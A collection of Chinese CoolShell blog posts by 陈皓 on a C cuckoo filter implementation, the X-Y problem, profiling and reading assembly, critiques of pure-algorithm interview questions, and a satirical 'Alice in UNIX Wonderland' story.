作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**（感谢网友** **@我的上铺叫路遥** **投稿）**对于海量数据处理业务，我们通常需要一个索引数据结构，用来帮助查询，快速判断数据记录是否存在，这种数据结构通常又叫过滤器(filter)。考虑这样一个场景，上网的时候需要在浏览器上输入URL，这时浏览器需要去判断这是否一个恶意的网站，它将对本地缓存的成千上万的URL索引进行过滤，如果不存在，就放行，如果（可能）存在，则向远程服务端发起验证请求，并回馈客户端给出警告。索引的存储又分为有序和无序，前者使用关联式容器，比如B树，后者使用哈希算法。这两类算法各有优劣：比如，关联式容器时间复杂度稳定O(logN)，且支持范围查询；又比如哈希算法的查询、增删都比较快O(1)，但这是在理想状态下的情形，遇到碰撞严重的情况，哈希算法的时间复杂度会退化到O(n)。因此，选择一个好的哈希算法是很重要的。时下一个非常流行的哈希索引结构就是 **bloom filter** ，它类似于bitmap这样的hashset，所以空间利用率很高。其独特的地方在于它使用多个哈希函数来避免哈希碰撞，如图所示（来源wikipedia），bit数组初始化为全0，插入x时，x被3个哈希函数分别映射到3个不同的bit位上并置1，查询x时，只有被这3个函数映射到的bit位全部是1才能说明x可能存在，但凡至少出现一个0表示x肯定不存在。
!Bloom_filter但是，bloom filter的这种位图模式带来两个问题：一个是 **误报（false positives）** ，在查询时能提供“一定不存在”，但只能提供“可能存在”，因为存在其它元素被映射到部分相同bit位上，导致该位置1，那么一个不存在的元素可能会被误报成存在；另一个是 **漏报（false nagatives）** ，同样道理，如果删除了某个元素，导致该映射bit位被置0，那么本来存在的元素会被漏报成不存在。由于后者问题严重得多，所以bloom filter必须确保“definitely no”从而容忍“probably yes”，不允许元素的删除。关于元素删除的问题，一个改良方案是对bloom filter引入计数，但这样一来，原来每个bit空间就要扩张成一个计数值，空间效率上又降低了。#### Cuckoo Hashing为了解决这一问题，本文引入了一种新的哈希算法—— **cuckoo filter** ，它既可以确保该元素存在的必然性，又可以在不违背此前提下删除任意元素，仅仅比bitmap牺牲了微量空间效率。先说明一下，这个算法的思想来源是一篇CMU论文，笔者按照其思路用C语言做了一个简单实现（Github），附上对一段文本数据进行导入导出的正确性测试。
接下来我会结合自己的示例代码讲解哈希算法的实现。我们先来看看cuckoo hashing有什么特点，它的哈希函数是成对的（具体的实现可以根据需求设计），每一个元素都是两个，分别映射到两个位置，一个是记录的位置，另一个是备用位置。这个备用位置是处理碰撞时用的，这就要说到cuckoo这个名词的典故了，中文名叫布谷鸟，这种鸟有一种即狡猾又贪婪的习性，它不肯自己筑巢，而是把蛋下到别的鸟巢里，而且它的幼鸟又会比别的鸟早出生，布谷幼鸟天生有一种残忍的动作，幼鸟会拼命把未出生的其它鸟蛋挤出窝巢，今后以便独享“养父母”的食物。借助生物学上这一典故，cuckoo hashing处理碰撞的方法，就是把原来占用位置的这个元素踢走，不过被踢出去的元素还要比鸟蛋幸运，因为它还有一个备用位置可以安置，如果备用位置上还有人，再把它踢走，如此往复。直到被踢的次数达到一个上限，才确认哈希表已满，并执行rehash操作。如下图所示（图片来源）：!cuckoo_preview我们不禁要问发生哈希碰撞之前的空间利用率是多少呢？不幸地告诉你，一维数组的哈希表上跟其它哈希函数没什么区别，也就50%而已。但如果是二维的呢？一个改进的哈希表如下图所示，每个桶（bucket）有4路槽位（slot）。当哈希函数映射到同一个bucket中，在其它三路slot未被填满之前，是不会有元素被踢的，这大大缓冲了碰撞的几率。笔者自己的简单实现上测过，采用二维哈希表（4路slot）大约80%的占用率（CMU论文数据据说达到90%以上，应该是扩大了slot关联数目所致）。
!cuckoo hashing#### Cuckoo Filter设计与实现cuckoo hashing的原理介绍完了，下面就来演示一下笔者自己实现的一个cuckoo filter应用，简单易用为主，不到500行C代码。应用场景是这样的：假设有一段文本数据，我们把它通过cuckoo filter导入到一个虚拟的flash中，再把它导出到另一个文本文件中。flash存储的单元页面是一个log_entry，里面包含了一对key/value，value就是文本数据，key就是这段大小的数据的SHA1值（照理说SHA1是可以通过数据源生成，没必要存储到flash，但这里主要为了测试而故意设计的，万一key和value之间没有推导关系呢）。#define SECTOR_SIZE    (1 << 10)     #define DAT_LEN        (SECTOR_SIZE - 20)  /* minus sha1 size */顺便说明一下DAT_LEN设置，之前我们设计了一个虚拟flash（用malloc模拟出来），由于flash的单位是按页大小SECTOR_SIZE读写，这里假设每个log_entry正好一个页大小，当然可以根据实际情况调整。
以上是flash的存储结构，至于哈希表里的slot有三个成员tag，status和offset，分别是哈希值，状态值和在flash的偏移位置。其中status有三个枚举值：AVAILIBLE，OCCUPIED，DELETED，分别表示这个slot是空闲的，占用的还是被删除的。至于tag，按理说应该有两个哈希值，对应两个哈希函数，但其中一个已经对应bucket的位置上了，所以我们只要保存另一个备用bucket的位置就行了，这样万一被踢，只要用这个tag就可以找到它的另一个安身之所。乍看之下size有点大是吗？没关系，你也可以根据情况调整数据类型大小，比如uint16_t，这里仅仅为了测试正确性。至于哈希表以及bucket和slot的创建见初始化代码。buckets是一个二级指针，每个bucket指向4个slot大小的缓存，即4路slot，那么bucket_num也就是slot_num的1/4。这里我们故意把slot_num调小了点，为的是测试rehash的发生。#define ASSOC_WAY  (4)  /* 4-way association */下面是哈希函数的设计，这里有两个，前面提到既然key是20字节的SHA1值，我们就可以分别是对key的低32位和高32位进行位运算，只要bucket_num满足2的幂次方，我们就可以将key的一部分同bucket_num – 1相与，就可以定位到相应的bucket位置上，注意bucket_num随着rehash而增大，哈希函数简单的好处是求哈希值十分快。
#define cuckoo_hash_lsb(key, count)  (((size_t *)(key))[0] & (count - 1))     #define cuckoo_hash_msb(key, count)  (((size_t *)(key))[1] & (count - 1))终于要讲解cuckoo filter最重要的三个操作了——查询、插入还有删除。查询操作是简单的，我们对传进来的参数key进行两次哈希求值tag[0]和tag[1]，并先用tag[0]定位到bucket的位置，从4路slot中再去对比tag[1]。只有比中了tag后，由于只是key的一部分，我们再去从flash中验证完整的key，并把数据在flash中的偏移值read_addr输出返回。相应的，如果bucket[tag[0]]的4路slot都没有比中，我们再去bucket[tag[1]]中比对（代码略），如果还比不中，可以肯定这个key不存在。 **这种设计的好处就是减少了不必要的flash读操作，每次比对的是内存中的tag而不需要完整的key。**tag[0] = cuckoo_hash_lsb(key, table->bucket_num);     tag[1] = cuckoo_hash_msb(key, table->bucket_num);
接下来先将简单的删除操作，之所以简单是因为delete除了将相应slot的状态值设置一下之外，其实什么都没有干，也就是说它不会真正到flash里面去把数据清除掉。为什么？很简单，没有必要。还有一个原因，flash的写操作之前需要擦除整个页面，这种擦除是会折寿的， **所以很多flash支持随机读，但必须保持顺序写。**tag[0] = cuckoo_hash_lsb(key, table->bucket_num);     tag[1] = cuckoo_hash_msb(key, table->bucket_num);了解了flash的读写特性，你就知道为啥插入操作在flash层面要设计成append。不过我们这里不讨论过多flash细节，哈希表层面的插入逻辑其实跟查询差不多，我就不贴代码了。这里要贴的是如何判断并处理碰撞，其实这里也没啥玄机，就是用old_tag和old_offset保存一下临时变量，以便一个元素被踢出去之后还能找到备用的安身之所。但这里会有一个判断，每次踢人都会计数，当alt_cnt大于512时候表示哈希表真的快满了，这时候需要rehash了。/* Kick out the old bucket and move it to the alternative bucket. */     offset = *p_offset;     slot = table->buckets[tag[0]];     old_tag[0] = tag[0];     old_tag[1] = slot[0].tag;     old_offset = slot[0].offset;     slot[0].tag = tag[1];     slot[0].offset = offset;     i = 0 ^ 1;     k = 0;     alt_cnt = 0;
return 0;     }rehash的逻辑也很简单，无非就是把哈希表中的buckets和slots重新realloc一下，空间扩展一倍，然后再从flash中的key重新插入到新的哈希表里去。这里有个陷阱要注意， **千万不能有相同的key混进来！** 虽然cuckoo hashing不像开链法那样会退化成O(n)，但由于每个元素有两个哈希值，而且每次计算的哈希值随着哈希表rehash的规模而不同，相同的key并不能立即检测到冲突，但当相同的key达到一定规模后，噩梦就开始了，由于rehash里面有插入操作，一旦在这里触发碰撞，又会触发rehash，这时就是一个rehash不断递归的过程，由于其中老的内存没释放，新的内存不断重新分配，整个程序就如同陷入DoS攻击一般瘫痪了。 **所以每次插入操作前一定要判断一下key是否已经存在过，并且对rehash里的插入使用碰撞断言防止此类情况发生。** 笔者在测试中不幸中了这样的彩蛋，调试了大半天才搞清楚原因，搞IT的同学们记住一定要防小人啊~到此为止代码的逻辑还是比较简单，使用效果如何呢？我来帮你找个大文件unqlite.c测试一下，这是一个嵌入式数据库源代码，共59959行代码。作为需要导入的文件，编译我们的cuckoo filter，然后执行：
`./cuckoo_db unqlite.c output.c`你会发现生成output.c正好也是59959行代码，一分不差，probably yes终于变成了definitely yes。同时也可以看到，cuckoo filter真的很快！如果你想看hashing的整个过程，可以参照README里把调试宏打开。最后，欢迎给这个小玩意提交PR！#### 参考资料Cuckoo Filter的论文和PPT：Cuckoo Filter: Practically Better Than Bloom# 计算机编程简史图作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn这个图片太经典了，本来想翻译的，后来觉得这么经典的图片可能早已被人翻译了，简单的Google一下，果然有人翻译了。那我就把英文版和中文版都转过来吧。我们可以看到，其中很大一部分人都和Unix有着不解之缘（参见《Unix传奇上篇，Unix传奇下篇》）* 英文原版   * 中文翻译版什么也不说了，直接上图（图片比较大，单击图片看大图）* * *计算机编程简史图（英文版）* * *计算机编程简史图（中文版）
# X-Y Problem作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn#### X-Y Problem对于X-Y Problem的意思如下：1）有人想解决问题X   2）他觉得Y可能是解决X问题的方法   3）但是他不知道Y应该怎么做   4）于是他去问别人Y应该怎么做？简而言之， **没有去问怎么解决问题X，而是去问解决方案Y应该怎么去实现和操作** 。于是乎：1）热心的人们帮助并告诉这个人Y应该怎么搞，但是大家都觉得Y这个方案有点怪异。   2）在经过大量地讨论和浪费了大量的时间后，热心的人终于明白了原始的问题X是怎么一回事。   3）于是大家都发现，Y根本就不是用来解决X的合适的方案。X-Y Problem最大的严重的问题就是： **在一个根本错误的方向上浪费他人大量的时间和精力** ！#### 示例举个两个例子：> Q) 我怎么用Shell取得一个字符串的后3位字符？   >  A1) 如果这个字符的变量是$foo，你可以这样来 echo ${foo:-3}   >  A2) 为什么你要取后3位？你想干什么？   >  Q) 其实我就想取文件的扩展名   >  A1) 我靠，原来你要干这事，那我的方法不对，文件的扩展名并不保证一定有3位啊。   >  A1) 如果你的文件必然有扩展名的话，你可以这来样来：echo ${foo##*.}
再来一个示例：> Q）问一下大家，我如何得到一个文件的大小   >  A1) size = `ls -l $file | awk '{print $5}'`   >  Q) 哦，要是这个文件名是个目录呢？   >  A2) 用du吧   >  A3) 不好意思，你到底是要文件的大小还是目录的大小？你到底要干什么？   >  Q) 我想把一个目录下的每个文件的每个块（第一个块有512个字节）拿出来做md5，并且计算他们的大小 ……   >  A1) 哦，你可以使用dd吧。   >  A2) dd不行吧。   >  A3) 你用md5来计算这些块的目的是什么？你究竟想干什么啊？   >  Q) 其实，我想写一个网盘，对于小文件就直接传输了，对于大文件我想分块做增量同步。   >  A2) 用rsync啊，你妹！这里有篇文章说明了X-Y Problem的各种案例说明，我从其中摘出三个来让大家看看：> 你试图做X，并想到了用Y方案。所以你去问别人Y，但根本不提X。于是，你可以会错过本来可能有更好更适合的方案，除非你告诉大家X是什么。 > > — _fromRe: How do I keep the command line from eating the > backslashes? by > revdiablo_
> 有些人问怎么做Y，但其它他想做的是X。他问怎么做Y是因为他觉得Y是最好搞定X的方法。 > 于是大家不断地回答“试试这个，试试那个”来帮助他，而他总是在说“这个有问题，那个有问题，因为……”。基本不同的情况，其它的方案可能会更好。 > > — _fromRe: Re: Re: Re: regex to validate e-mail addresses and phone > numbers by > Limbic~Region_> X-Y Problem又叫“过早下结论”：提问者其实并不非常清楚想要解决的X问题，他猜测用Y可以搞定，于是他问大家如何实现Y。 > > — _from[<[email > protected]>](https://groups.google.com/groups?hl=en&selm=Pine.GHP.4.21.0009061210570.8800-100000@hpplus03.cern.ch) > by Alan J. Flavell_其实这个问题在我之前的《你会问问题吗》里提到的那篇How To Ask Questions the Smart Way中的提到过，你可以移步去看一下。
所以，我们在寻求别人帮助的时候，最好把我们想解决的问题和整个事情的来龙去脉说清楚。#### 一些变种我们不要以为X-Y Problem就像上面那样的简单，我们不会出现，其实我们生活的这个世界有有各种X-Y Problem的变种。下面我个人觉得非常像XY Problem的总是：其一、大多数人有时候，非常容易把手段当目的，他们会用自己所喜欢的技术和方法来反推用户的需求，于是很有可能就会出现X-Y Problem – 也许解决用户需求最适合的技术方案是PC，但是我们要让他们用手机。其二、产品经理有时候并不清楚他想解决的用户需求是什么，于是他觉得可能开发Y的功能能够满足用户，于是他提出了Y的需求让技术人员去做，但那根本不是解决X问题的最佳方案。其三、因为公司或部门的一些战略安排，业务部门设计了相关的业务规划，然后这些业务规划更多的是公司想要的Y，而不是解决用户的X问题。其四、对于个人的职业发展，X是成长为有更强的技能和能力，这个可以拥有比别人更强的竞争力，从而可以有更好的报酬，但确走向了Y：全身心地追逐KPI。其五、本来我们想达成的X是做出更好和更有价值的产品，但最终走到了Y：通过各种手段提升安装量，点击量，在线量，用户量来衡量。
其六、很多团队Leader都喜欢制造信息不平等，并不告诉团队某个事情的来由，掩盖X，而直接把要做的Y告诉团队，导致团队并不真正地理解，而产生了很多时间和经历的浪费。所有的这些，在我心中都是X-Y Problem的变种，这是不是一种刻舟求剑的表现？#### 参考* StackOverflow: What is XY Problem?   * PerlMonks: XY Problem   * Greg’s Wiki（全文完）# 代码优化概要作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn本文译自Dr. Dobb’s Blogger的Walter Bright写的《Overlooked Essentials For Optimizing Code》* * *我编写程序至今有35年了，我做了很多关于程序执行速度方面优化的工(一个示例)，我也看过其它人做的优化。我发现有两个最基本的优化技术总是被人所忽略。 注意，这两个技术并不是避免时机不成熟的优化。并不是把冒泡排序变成快速排序（算法优化）。也不是语言或是编译器的优化。也不是把 i*4写成i<<2 的优化。 这两个技术是：
1. 使用 一个profiler。   2. 查看程序执行时的汇编码。使用这两个技术的人将会成功地写出运行快的代码，不会使用这两个技术的人则不行。下面让我为你细细道来。#### 使用一个 Profiler我们知道，程序运行时的90%的时间是用在了10%的代码上。我发现这并不准确。一次又一次地，我发现，几乎所有的程序会在1%的代码上花了99%的运行时间。但是，是哪个1%？一个好的Profiler可以告诉你这个答案。就算我们需要使用100个小时在这1%的代码上进行优化，也比使用100个小时在其它99%的代码上优化产生的效益要高得多得多。 问题是什么？人们不用profiler？不是。我工作过的一个地方使用了一个华丽而奢侈的Profiler，但是自从购买这个Profiler后，它的包装3年来还是那么的暂新。为什么人们不用？我真的不知道。有一次，我和我的同事去了一个负载过大的交易所，我同事坚持说他知道哪里是瓶颈，毕竟，他是一个很有经验的专家。最终，我把我的Profiler在他的项目上运行了一下，我们发现那个瓶颈完全在一个意想不到的地方。 就像是赛车一样。团队是赢在传感器和日志上，这些东西提供了所有的一切。你可以调整一下赛车手的裤子以让其在比赛过程中更舒服，但是这不会让你赢得比赛，也不会让你更有竞争力。如果你不知道你的速度上不去是因为引擎、排气装置、空体动力学、轮胎气压，或是赛车手，那么你将无法获胜。编程为什么会不同呢？只要没有测量，你就永远无法进步。 这个世界上有太多可以使用的Profiler了。随便找一个你就可以看到你的函数的调用层次，调用的次数，以前每条代码的时间分解表（甚至可以到汇编级）。我看过太多的程序员回避使用Profiler，而是把时间花在那些无用的，错误的方向上的“优化”，而被其竞争对手所羞辱。（ **译者陈皓注** ：使用Profiler时，重点需要关注：1）花时间多的函数以优化其算法，2）调用次数巨多的函数——如果一个函数每秒被调用300K次，你只需要优化出0.001毫秒，那也是相当大的优化。这就是作者所谓的1%的代码占用了99%的CPU时间）
#### 查看汇编代码几年前，我有一个同事，Mary Bailey，她在华盛顿大学教矫正代数（remedial algebra），有一次，她在黑板上写下： `x + 3 = 5` 然后问他的学生“求解x”，然后学生们不知道答案。于是她写下： `__ + 3 = 5` 然后，再问学生“填空”，所有的学生都可以回答了。未知数x就像是一个有魔法的字母让大家都在想“x意味着代数，而我没有学过代数，所以我就不知道这个怎么做”。 汇编程序就是编程世界的代数。如果某人问我“inline函数是否被编译器展开了？”或是问我“如果我写下i*4，编译器会把其优化为左移位操作吗？”。这个时候，我都会建议他们看看编译器的汇编码。这样的回答是不是很粗暴和无用？通常，在我这样回答了提问者后，提问都通常都会说，对不起，我不知道什么是汇编！甚至C++的专家都会这么回答。 汇编语言是最简单的编程语言了（就算是和C++相比也是这样的），如：`ADD ESI,x`就是（C风格的代码）`ESI += x;`而：`CALL foo`则是：`foo();`细节因为CPU的种类而不同，但这就是其如何工作的。有时候，我们甚至都不需要细节，只需要看看汇编码的长啥样，然后和源代码比一比，你就可以知道汇编代码很多很多了。 那么，这又如何帮助代码优化？举个例子，我几年前认识一个程序员认为他应该去发现一个新的更快的算法。他有一个benchmark来证明这个算法，并且其写了一篇非常漂亮的文章关于他的这个算法。但是，有人看了一下其原来算法以及新算法的汇编，发现了他的改进版本的算法允许其编译器把两个除法操作变成了一个。这和算法真的没有什么关系。我们知道除法操作是一个很昂贵的操作，并且在其算法中，这俩个除法操作还在一个内嵌循环中，所以，他的改进版的算法当然要快一些。但，只需要在原来的算法上做一点点小的改动——使用一个除法操作，那么其原来的算法将会和新的一样快。而他的新发现什么也不是。 下一个例子，一个D用户张贴了一个 benchmark 来显示 dmd (Digital Mars D 编译器)在整型算法上的很糟糕，而ldc (LLVM D 编译器) 就好很多了。对于这样的结果，其相当的有意见。我迅速地看了一下汇编，发现两个编译器编译出来相当的一致，并没有什么明显的东西要对2：1这么大的不同而负责。但是我们看到有一个对long型整数的除法，这个除法调用了运行库。而这个库成为消耗时间的杀手，其它所有的加减法都没有速度上的影响。出乎意料地，benchmark 和算法代码生成一点关系也没有，完全就是long型整数的除法的问题。这暴露了在dmd的运行库中的long型除法的实现很差。修正后就可以提高速度。所以，这和编译器没有什么关系，但是如果不看汇编，你将无法发现这一切。 查看汇编代码经常会给你一些意想不到的东西让你知道为什么程序的性能是那样。一些意想不到的函数调用，预料不到的自傲，以及不应该存在的东西，等等其实所有的一切。但也不需要成为一个汇编代码的黑客才能干的事。
#### 结论如果你觉得需要程序有更好的执行速度，那么，最基本的方法就是使用一个profiler和愿意去查看一下其汇编代码以找到程序的瓶颈。只有找到了程序的瓶颈，此时才是真正在思考如何去改进的时候，比如思考一个更好的算法，使用更快的语言优化，等等。 常规的做法是制胜法宝是挑选一个最佳的算法而不是进行微优化。虽然这种做法是无可异议的，但是有两件事情是学校没有教给你而需要你重点注意的。第一个也是最重要的，如果你优化的算法没没有参与到你程序性能中的算法，那么你优化他只是在浪费时间和精力，并且还转移了你的注意力让你错过了应该要去优化的部分。第二点，算法的性能总和处理的数据密切相关的，就算是冒泡排序有那么多的笑柄，但是如果其处理的数据基本是排好序的，只有其中几个数据是未排序的，那么冒泡排序也是所有排序算法里性能最好的。所以，担心没有使用好的算法而不去测量，只会浪费时间，无论是你的还是计算机的。 就好像赛车零件的订购速底是不会让你更靠进冠军（就算是你正确安装零件也不会），没有Profiler，你不会知道问题在哪里，不去看汇编，你可能知道问题所在，但你往往不知道为什么。 (全文完)# 为什么我反对纯算法面试题
作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn算法面试可能是微软搞出来的面试方法，现在很多公司都在效仿，而且我们的程序员也乐于解算法题，我个人以为，这是应试教育的毒瘤！我在《再谈“我是怎么招程序员”》中比较保守地说过，“ **问难的算法题并没有错，错的很多面试官只是在肤浅甚至错误地理解着面试算法题的目的** 。”，今天，我想加强一下这个观点—— **我反对纯算法题面试** ！（注意，我说的是纯算法题）图片源Wikipedia（点击图片查看词条）我再次引用我以前的一个观点——能解算法题并不意味着这个人就有能力就能在工作中解决问题，你可以想想，小学奥数题可能比这些题更难，但并不意味着那些奥数能手就能解决实际问题。好了，让我们来看一个示例（这个示例是昨天在微博上的一个讨论），这个题是——“ **找出无序数组中第2大的数** ”，几乎所有的人都用了O(n)的算法，我相信对于我们这些应试教育出来的人来说，不用排序用O(n)算法是很正常的事，连我都不由自主地认为O(n)算法是这个题的标准答案。 **我们太习惯于标准答案了，这是我国教育最悲哀的地方** 。（广义的洗脑就是让你的意识依赖于某个标准答案，然后通过给你标准答案让你不会思考而控制你）
目录* 功能性需求分析   * 非功能性需求分析   * 工程式的解法   * 争论   * 小结#### 功能性需求分析试想，如果我们在实际工作中得到这样一个题 我们会怎么做？我一定会分析这个需求，因为我害怕需求未来会改变，今天你叫我找一个第2大的数，明天你找我找一个第4大的数，后天叫我找一个第100大的数，我不搞死了。需求变化是很正常的事。分析完这个需求后，我会很自然地去写找第K大数的算法——难度一下子就增大了。很多人会以为找第K大的需求是一种“过早扩展”的思路，不是这样的，我相信我们在实际编码中写过太多这样的程序了，你一定不会设计出这样的函数接口—— Find2ndMaxNum(int* array, int len)，就好像你不会设计出 DestroyBaghdad(); 这样的接口，而是设计一个DestoryCity( City& ); 的接口，而把Baghdad当成参数传进去！所以，你应该是声明一个叫FindKthMaxNum(int* array, int len, int kth)，把2当成参数传进去。 **这是最基本的编程方法，用数学的话来说，叫代数** ！最简单的需求分析方法就是把需求翻译成函数名，然后看看是这个接口不是很二？！
（注：不要纠结于FindMaxNum()或FindMinNum()，因为这两个函数名的业务意义很清楚了，不像Find2ndMaxNum()那么二）#### 非功能性需求分析性能之类的东西从来都是非功能性需求，对于算法题，我们太喜欢研究算法题的空间和时间复杂度了。我们希望做到空间和时间双丰收，这是算法学术界的风格。所以， **习惯于标准答案的我们已经失去思考的能力，只会机械地思考算法之内的性能，而忽略了算法之外的性能** 。如果题目是——“从无序数组中找到第K个最大的数”，那么，我们一定会去思考用O(n)的线性算法找出第K个数。事实上，也有线性算法——STL中可以用nth_element求得类似的第n大的数，其利用快速排序的思想，从数组S中随机找出一个元素X，把数组分为两部分Sa和Sb。Sa中的元素大于等于X，Sb中元素小于X。这时有两种情况：1）Sa中元素的个数小于k，则Sb中的第k-|Sa|个元素即为第k大数；2） Sa中元素的个数大于等于k，则返回Sa中的第k大数。时间复杂度近似为O(n)。搞学术的nuts们到了这一步一定会欢呼胜利！但是他们哪里能想得到性能的需求分析也是来源自业务的！
**我们一说性能，基本上是个人都会问，请求量有多大？如果我们的FindKthMaxNum()的请求量是m次，那么你的这个每次都要O(n)复杂度的算法得到的效果就是O(n*m)，这一点，是书呆子式的学院派人永远想不到的。** 因为应试教育让我们不会从实际思考了。#### 工程式的解法根据上面的需求分析，有软件工程经验的人的解法通常会这样：1）把数组排序，从大到小。2）于是你要第k大的数，就直接访问 array[k]。排序只需要一次，O(n*log(n))，然后，接下来的m次对FindKthMaxNum()的调用全是O(1)的，整体复杂度反而成了线性的。其实，上述的还不是工程式的最好的解法，因为，在业务中，那数组中的数据可能会是会变化的，所以，如果是用数组排序的话，有数据的改动会让我重新排序，这个太耗性能了，如果实际情况中会有很多的插入或删除操作，那么可以考虑使用B+树。工程式的解法有以下特点：1）很方便扩展，因为数据排好序了，你还可以方便地支持各种需求，如从第k1大到k2大的数据（那些学院派写出来的代码在拿到这个需求时又开始挠头苦想了）2）规整的数据会简化整体的算法复杂度，从而整体性能会更好。（公欲善其事，必先利其器）
3）代码变得清晰，易懂，易维护！（学院派的和STL一样的近似O(n)复杂度的算法没人敢动）#### 争论你可能会和我有以下争论，* **如果程序员做这个算法题用排序的方式，他一定不会像你想那么多** 。是的，你说得对。但是我想说，很多时候，我们直觉地思考，恰恰是正确的路。因为“排序”这个思路符合人类大脑处理问题的方式，而使用学院派的方式是反大脑直觉的。反大脑直觉的，通常意味着晦涩难懂，维护成本上升。* **就是一道面试题，我就是想测试一下你的算法技能，这也扯太多了** 。没问题，不过，我们要清楚我们是在招什么人？是一个只会写算法的人，还是一个会做软件的人？这个只有你自己最清楚。* **这个算法题太容易诱导到学院派的思路了** 。是的这道“找出第K大的数”，其实可以变换为更为业务一点的题目——“ **我要和别的商户竞价，我想排在所有竞争对手报价的第K名，请写一个程序，我输入K，和一个商品名，系统告诉我应该订多少价？** （商家的所有商品的报价在一数组中）”——业务分析，整体性能，算法，数据结构，增加需求让应聘者重构，这一个问题就全考了。* **你是不是在说算法不重要，不用学？** 千万别这样理解我，搞得好像如果面试不面，我就可以不学。 **算法很重要，算法题能锻炼我们的思维，而且也有很多实际用处** 。我这篇文章不是让大家不要去学算法，这是完全错误的，我是让大家带着业务问题去使用算法。问你业务问题，一样会问到算法题上来。
#### 小结看过这上面的分析，我相信你明白我为什么反对纯算法面试题了。原因就是 **纯算法的面试题根本不能反应一个程序的综合素质** ！那么，在面试中，我们应该要考量程序员的那些综合素质呢？我以为有下面这些东西：1. 会不会做需求分析？怎么理解问题的？   2. 解决问题的思路是什么？想法如何？   3. 会不会对基础的算法和数据结构灵活运用？另外，我们知道，对于软件开发来说，在工程上，难是的下面是这些挑战：* 软件的维护成本远远大于软件的开发成本。   * 软件的质量变得越来越重要，所以，测试工作也变得越来越重要。   * 软件的需求总是在变的，软件的需求总是一点一点往上加的。   * 程序中大量的代码都是在处理一些错误的或是不正常的流程。所以，对于编程能力上，我们应该主要考量程序员的如下能力：1. 设计是否满足对需求的理解，并可以应对可能出现的需求变化。   2. 程序是否易读，易维护？   3. 重构代码的能力如何？   4. 会不会测试自己写好的程序？所以，这段时间，我越来越倾向于问应聘者一些有业务意义的题，而且应增加或更改需求来看程序员的重构代码的能力，写完程序后，让应聘者设计测试案例。
比如：解析加减乘除表达式，字符串转数字，洗牌程序，口令生成器，通过ip地址找地点，英汉词典双向检索……**总之，我反对纯算法面试题！**（全文完）# Alice梦游UNIX仙境作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn本文来源：   （这是一篇1989年的文章）Alice 正在在她的显示器上读着一些信息，她开会怀疑所有的事情并不是应该的那样。“程序太大了，而无法适应内存”，她读到。“一个很奇怪的事情”，她说，“我所做的也就是在启动我的字处理程序会运行了14个TSR（terminate-and-stay-resident 常驻程序）。所有这些程序需要使用4M的内存，我希望我能使用超过640K以上的内存”。就在那个时候，一个小的白色的顾问（一个非常白的顾问）跑过了房间。“哦，我的外套和领带”，他说到，“我要迟到了。并且是每小时150元。”Alice本想对他说点什么，他却跳到了Alice的显示器里并到在操作系统后面消失了。Alice 从来没有见过有人可以跳到显示器里，并且肯定不是通过操作系统干。但是，曾有人告诉他，DOS这个操作系统是非常肤浅的。于是，她没有怎么犹豫，Alice也跳了进去。
Alice发现她自己在一个明亮的走廊里。她不知道要做什么，她开始向前走，走过了一个拐角后，她发现她的前面有两个小胖子，他们互相搂着对对方的脖子。一个人的领口上绣着“POS”，另一个则是“NEG”。“我知道”，Alice说，“你俩是晶体管”。“是的”，Positive回答到。“你们能帮我吗？”Alice问道。“不能”，Negative回答。“我在找一个白色的顾问”，Alice指着她走过来的方向，“他走的是这条路吗？”Alice继续问道。“不是”，Negative回答到。Alice又指了另一条路。“是的”，Postive回答到。很快，Alice来到了一个很大的棕色的桌前。那个顾问就在那里，名字叫Mad Hacker，并且有一些Alice并不知道的生物围在桌边。在角落里，有一个睡鼠在那熟睡。在桌子上放着一个大的标牌 ，上面写着“UNIX Conference”每一个人除了那只睡鼠都有一个纸杯，纸杯里应该是奶油蛋羹的样子。“错误的佐料”，他们所有人都这么说，并把杯子传递给他们右手边的人，并且优雅地从他们的左边接过杯子。Alice 看着他们重复着这个仪式三到四次后，她也坐到了他们中间。马上，一个很大的癞蛤蟆跳到了他的大腿上，并看着她就好像希望得到Alice的宠爱。“Grep”，它叫到。
“别介意”，Mad Hacker解释道，“他只是想查找一些字符串”。“Nroff？” 蛤蟆问到。Mad Hacker 给了Alice一个有看似有奶油蛋羹杯子以及一把勺子。“这里”，他问到，“你对这个有什么想法？”“看起来很可爱”，Alice说，“非常甜”。她边说边尝了一勺。“讨厌！”他叫到，“真糟糕，这是什么啊？！”“哦，这只不过是Unix的另一个图形界面”，Hacker回答道。Alice 指着角落里的那只睡鼠说：“他是谁？”“那也是一个操作系统”，Hacker解释道，“我们几乎放弃了去把他唤醒过来”。就在这个时候，坐在睡鼠旁边的一个很大的蓝色的大象站了起来。“女士们，先生们”，他很傲慢地说到，“作为在这里的一个最大的生物，我感到我们必需开明地来看一下……”一个在桌子另一边的年轻的“工作麻雀”愤努地站了起来。大象注意这事，并改变了他的演讲，“……什么是我们下一步的行动”。有一半的生物鞠躬至敬，而另一半的生物偷偷窃笑。这个时候，睡鼠醒过来了，要和这个大象合并。没人有一丁点的惊讶。“我们需要什么”，一只Sun熊宣称，他用他的长甜头舔了舔那个奶油蛋羹说道，“我们需要的是一个像Macintosh那样的调料”。
突然，那个白色顾问红着脸跳了起来，“不，不，不！”他尖叫着，“没有人会150元一小时的费用给Macintosh！”“Awk”，青蛙说道。“用户”，Sun熊解释到，“用户们希望的是那种简单到不需要学习的用户接口”。“用户？”Hacker叫到“用户？！你说的是那些秘书，会计，建筑师，以及体力劳动者！”“喔”Sun熊说到，“我得做点什么得让他们把系统切换到UNIX”。“你们是否觉得，”一个正在桌子上打洞的啄木鸟说，“我们一同使用Unix这个名字会是一个问题？我的意思是，这样想的并不只有我一个人。”“也许我们应该试试别的名字”，工作麻雀说，“比如：Brut或Rambo”。“Penix” 一只企鹅说到。“mount”，蛤蟆说，“spawn”。Alice 拍了一下蛤蟆。“nice?” 蛤蟆问到。“但是”，啄木鸟又建议到，“ShrinkWap的问题怎么办？”突然，每一个人都跳了起来，而且都变得活跃起来，挥动着他们的双手大叫着，但只一会，他们又全都坐下来。“现在这个问题解决了”，啄木鸟说，“让我们回到调料的问题上来吧”。于是，桌子边的每个人又采样了一个新的奶油蛋羹，继续说到“错误的调料”，然后把杯子传给右边的人，并从左边的人接过杯子。
